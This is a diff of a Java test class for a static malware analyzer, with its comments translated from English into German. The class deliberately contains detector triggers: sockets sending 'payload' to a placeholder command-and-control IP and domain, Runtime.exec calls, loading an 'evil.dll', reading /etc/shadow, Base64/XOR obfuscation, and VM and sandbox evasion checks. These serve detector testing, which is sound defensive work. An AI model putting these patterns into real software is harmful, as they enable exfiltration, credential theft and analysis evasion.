@@ -1,24 +1,16 @@
 package org.example.test;
 
-// ---
-// 1. FORBIDDEN & SUSPICIOUS IMPORTS
-// ---
-// These imports should be flagged by the analyzer based on config.json
-// Forbidden Packages
-import java.lang.reflect.Method; // [VIOLATION] Forbidden package: java.lang.reflect
 
-// Forbidden Classes
-import java.lang.Runtime; // [VIOLATION] Forbidden class: java.lang.Runtime
-import java.lang.ProcessBuilder; // [VIOLATION] Forbidden class: java.lang.ProcessBuilder
-import java.awt.Robot; // [VIOLATION] Forbidden class: java.awt.Robot
+import java.lang.reflect.Method;
 
-// Suspicious Classes
-import java.net.Socket; // [VIOLATION] Suspicious class: java.net.Socket
-import javax.crypto.Cipher; // [VIOLATION] Suspicious class: javax.crypto.Cipher
-import java.io.ObjectInputStream; // [VIOLATION] Suspicious class: java.io.ObjectInputStream
-import java.security.MessageDigest; // [VIOLATION] Suspicious class: java.security.MessageDigest
+import java.lang.Runtime;
 
-// Safe Imports (for comparison)
+
+import java.net.Socket;
+import javax.crypto.Cipher;
+import java.io.ObjectInputStream;
+import java.security.MessageDigest;
+
 import java.io.File;
 import java.io.IOException;
 import java.io.InputStream;
@@ -28,25 +20,27 @@ import java.nio.file.Paths;
 import java.util.Base64;
 import java.util.Collections;
 
+/**
+ * Diese Test-Klasse enthält Muster die im StaticAnalyzer gesucht werden
+ */
 public class TestClass {
 
-    // ---
-    // 2. HARDCODED LITERALS
-    // ---
-    // These string literals should be flagged by the literal scanner.
 
-    // [VIOLATION] Hardcoded IP address
+    // Verdächtiges Literal das eine IP-Adresse enthält
     private static final String C2_SERVER_IP = "198.51.100.1";
 
-    // [VIOLATION] Hardcoded domain
+    // Verdächtiges Literal das einen Domain-Namen enthält
     private static final String C2_SERVER_DOMAIN = "malicious-control-server.com";
 
-    // [VIOLATION] Hardcoded IP (will be flagged again)
+    // Eine weitere IP-Adresse
     private final String backupServer = "192.168.1.100";
 
-    // This string is safe
+    // Dieser String ist unbedenklich
     private final String safeString = "This is a normal configuration string.";
 
+    /**
+     * Hauptmethode die alle Test-Trigger aufruft
+     */
     public static void main(String[] args) {
 
         TestClass testClass = new TestClass();
@@ -61,7 +55,7 @@ public class TestClass {
             testClass.triggerCryptominingPattern();
             testClass.triggerReflection();
         } catch (Exception e) {
-            // Suppress exceptions for testing purposes
+            // Exceptions für Testzwecke unterdrücken
             System.out.println("An expected error was caught: " + e.getMessage());
         }
 
@@ -69,117 +63,107 @@ public class TestClass {
     }
 
     /**
-     * 3. FORBIDDEN METHOD CALLS
-     * Triggers violations for executing commands and loading libraries.
+     * Löst Verstöße für das Ausführen von Befehlen und das Laden von Bibliotheken aus
      */
     public void triggerForbiddenMethods() throws IOException {
         System.out.println("Testing forbidden methods...");
 
-        // [VIOLATION] Forbidden method call: java.lang.Runtime.exec
+        // Methodenaufruf: java.lang.Runtime.exec (Verboten)
         Runtime.getRuntime().exec("calc.exe");
 
-        // [VIOLATION] Forbidden method call: java.lang.System.load
+        // Methodenaufruf: java.lang.System.load (Verboten)
         System.load("C:\\temp\\evil.dll");
     }
 
     /**
-     * 4. SUSPICIOUS FILE PATHS
-     * Triggers violations by accessing sensitive system locations.
+     * Löst Verstöße durch den Zugriff auf sensible Systempfade aus
      */
     public void triggerSuspiciousFileAccess() throws IOException {
         System.out.println("Testing suspicious file access...");
 
-        // [VIOLATION] Suspicious file path in constructor: /etc/
+        // Dateipfad im Konstruktor: /etc/ (Verdächtig)
         File shadowFile = new File("/etc/shadow");
         shadowFile.canRead();
 
-        // [VIOLATION] Suspicious file path in method: c:/windows
+        // Dateipfad in Methode: c:/windows (Verdächtig)
         Files.write(Paths.get("c:/windows/temp.txt"), Collections.singleton("test"));
 
-        // [VIOLATION] Suspicious file path in constructor: user.home
-        // The analyzer checks for the *literal string* "user.home"
+        // Verdächtiger Dateipfad im Konstruktor: user.home
+        // Der Analyzer prüft auf den exakten String "user.home"
         File userHomeFile = new File("C:/some/path/user.home/config.txt");
         userHomeFile.delete();
     }
 
     /**
-     * 5. NETWORK, CRYPTO, & HARDCODED LITERALS (Usage)
-     * Triggers violations for sockets, ciphers, and uses suspicious literals.
+     * Löst Verstöße für Sockets Ciphers und die Verwendung verdächtiger Literale aus
      */
     public void triggerNetworkAndCrypto() throws Exception {
         System.out.println("Testing network and crypto...");
 
-        // Uses suspicious class Socket.
-        // Also uses hardcoded IP and suspicious port 4444.
+        // Startet eine Socket-Verbindung (Verboten)
         try (Socket socket = new Socket(C2_SERVER_IP, 4444)) {
             socket.getOutputStream().write("payload".getBytes());
         }
 
-        // Uses suspicious class Socket.
-        // Also uses hardcoded domain and suspicious port 1337.
+        // Eine weitere Socket-Verbindung
         try (Socket socket2 = new Socket(C2_SERVER_DOMAIN, 1337)) {
             socket2.getOutputStream().write("payload".getBytes());
         }
 
-        // Uses suspicious class Cipher.
+        // Verwendet eine Crypto-Klasse (Verdächtig)
         Cipher.getInstance("AES/ECB/PKCS5Padding");
     }
 
     /**
-     * 6. OBFUSCATION TECHNIQUES
-     * Triggers violations for Base64 decoding and XOR loops.
+     * Löst Verstöße für Base64-Dekodierung und XOR-Schleifen aus
      */
     public void triggerObfuscation() {
         System.out.println("Testing obfuscation techniques...");
 
-        // [VIOLATION] Obfuscation method call: java.util.Base64.getDecoder
         String encoded = "Y2FsYy5leGU="; // "calc.exe"
+        // Verwendung von Base64 Decoder (Verdächtig)
         byte[] decoded = Base64.getDecoder().decode(encoded);
         System.out.println("Decoded: " + new String(decoded));
 
-        // [VIOLATION] Loop contains XOR operation
+        // Schleife enthält XOR-Operation (Verdächtig)
         byte[] encrypted = {22, 1, 3, 16};
         for (int i = 0; i < encrypted.length; i++) {
-            // This XOR operation should be flagged
+            // Diese XOR-Operation sollte erkannt werden
             encrypted[i] = (byte) (encrypted[i] ^ 0x5A);
         }
     }
 
     /**
-     * 7. ANTI-SANDBOX / DEBUGGING PATTERNS
-     * Triggers violations for timing-based evasion.
+     * Löst Verstöße für timing-basierte Umgehung aus
      */
     public void triggerAntiSandbox() {
         System.out.println("Testing anti-sandbox timing...");
 
-        // [VIOLATION] Method contains >= 2 timing calls
+        // Methode enthält >= 2 Timing-Aufrufe (Verdächtig)
         long start = System.nanoTime();
 
-        // Some trivial work
-        Math.log(12345.6789);
 
         long end = System.nanoTime();
         if (end - start > 1_000_000) { // 1ms
             System.out.println("Debugger detected!");
         }
 
-        // [VIOLATION] Timing call inside a loop
+        // Timing-Aufruf innerhalb einer Schleife (Verdächtig)
         for (int i = 0; i < 10; i++) {
             System.out.println("Looping...");
             if (System.currentTimeMillis() % 1000 == 0) {
-                // This is a suspicious pattern
+                // Das ist ein verdächtiges Muster
             }
         }
     }
 
     /**
-     * 8. SUSPICIOUS DESERIALIZATION
-     * Triggers violation for using ObjectInputStream.
+     * Löst Verstöße durch die Verwendung von ObjectInputStream aus
      */
     public void triggerDeserialization(InputStream in) throws Exception {
         System.out.println("Testing deserialization...");
 
-        // Uses suspicious class ObjectInputStream
+        // Verwendet verdächtige Klasse ObjectInputStream
         if (in != null) {
             ObjectInputStream ois = new ObjectInputStream(in);
             Object obj = ois.readObject();
@@ -188,22 +172,17 @@ public class TestClass {
     }
 
     /**
-     * 9. CRYPTOMINING PATTERN (Intent)
-     * This loop *should* be flagged for containing Hashing + BigInteger.
-     * Note: The current LoopBodyScanner doesn't seem to check for this,
-     * but the pattern is included for completeness.
+     * Diese Schleife *sollte* als verdächtig markiert werden da sie Hashing + BigInteger enthält
      */
     public void triggerCryptominingPattern() throws Exception {
         System.out.println("Testing cryptomining loop pattern...");
 
-        // Uses suspicious class MessageDigest
         MessageDigest md = MessageDigest.getInstance("SHA-256");
 
-        // [INTENT] This loop contains MessageDigest and BigInteger operations
+        // Diese Schleife enthält MessageDigest- und BigInteger-Operationen
         for (int i = 0; i < 100; i++) {
             String data = "block" + i;
             byte[] hash = md.digest(data.getBytes());
-            // Uses suspicious class BigInteger
             BigInteger hashInt = new BigInteger(1, hash);
             if (hashInt.bitLength() < 250) {
                 System.out.println("Found hash!");
@@ -212,46 +191,47 @@ public class TestClass {
     }
 
     /**
-     * 10. FORBIDDEN REFLECTION (Usage)
-     * Triggers violation by using the imported forbidden class.
+     * Löst Verstöße durch die Verwendung der importierten verbotenen Klasse aus
      */
     public void triggerReflection() throws Exception {
         System.out.println("Testing reflection usage...");
 
-        // Uses forbidden class Method (from import)
+        // Verwendet verbotene Klasse Method (aus Import)
         Method m = String.class.getMethod("toUpperCase");
         System.out.println(m.invoke("test"));
     }
 
+    /**
+     * Löst Verstöße für Fingerprinting und Anti-Analyse aus
+     */
     public void triggerFingerprintingEvasion() {
          System.out.println("Testing fingerprinting & evasion...");
 
-         // [VIOLATION] Accessing suspicious property "user.name"
+         // Zugriff auf verdächtige Property "user.name"
          String username = System.getProperty("user.name");
 
-         // [VIOLATION] Literal "sandbox" used in comparison (indirectly checked via visitLiteral)
+         // Literal "sandbox" in Vergleich genutzt (Verdächtig)
          if (username != null && username.toLowerCase().equals("sandbox")) {
              System.out.println("Sandbox username detected!");
-             // System.exit(0); // Evasion action
          }
 
-         // [VIOLATION] Accessing suspicious property "os.name"
+         // Zugriff auf verdächtige Property "os.name"
          String os = System.getProperty("os.name");
          System.out.println("OS: " + os);
 
-         // [VIOLATION] Literal "VMWare" used (indirectly checked via visitLiteral)
+         // Literal "VMWare" genutzt (Verdächtig)
          File vmwareTools = new File("C:\\Program Files\\VMware\\VMware Tools");
          if (vmwareTools.exists()) {
              System.out.println("VMWare detected!");
          }
 
-         // [VIOLATION] Literal "procmon.exe" used (indirectly checked via visitLiteral)
+         // Literal "procmon.exe" genutzt (Verdächtig)
          String toolCheck = "tasklist | findstr procmon.exe";
          try {
-             Runtime.getRuntime().exec(toolCheck); // exec is already flagged
+             Runtime.getRuntime().exec(toolCheck); // exec wird bereits erkannt
          } catch(IOException e) {}
 
-         // [VIOLATION] Dead code block if(false)
+         // Toter Code-Block (if(false)) (Verdächtig)
          if (false) {
              System.out.println("This should not print.");
          }
